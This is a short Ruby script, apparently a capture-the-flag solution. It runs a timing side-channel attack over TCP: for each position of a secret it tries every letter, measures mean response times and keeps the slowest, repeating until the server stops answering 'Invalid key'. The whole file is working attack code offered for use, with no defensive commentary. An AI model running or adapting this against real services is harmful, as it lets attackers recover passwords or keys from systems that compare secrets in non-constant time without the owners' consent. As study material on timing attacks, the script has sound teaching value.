#! /usr/bin/env ruby

require 'socket'
require 'Time'

SAMPLES = 5
ABC = ("a".."z").to_a + ("A".."Z").to_a

if ARGV.length != 2
	puts "usage: #{$0} ip port" 
	exit 1
end

ip = ARGV[0]
port = ARGV[1].to_i

def get_ch(s, flag)
	means = {}
	done = false
	ABC.each do |ch|
		total = 0.0
		SAMPLES.times do
			s.puts flag+ch
			t1 = Time.now
			line = s.gets
			t2 = Time.now
			total += t2 - t1
			done = true if not line.match(/Invalid key/)
		end
		mean = total / SAMPLES
		means[ch] = mean
		puts "ch=#{ch} ; mean=#{mean}"
	end
	max = means.max_by { |k, v| v }
	return max[0], done
end

TCPSocket.open(ip, port) do |s|
	flag = ""
	loop do
		ch, done = get_ch(s, flag)
		flag << ch
		if done
			puts %Q(Solved! The flag is: "#{flag}")
			break
		else
			puts %Q(The flag so far: "#{flag}")
		end
	end
	s.close
end
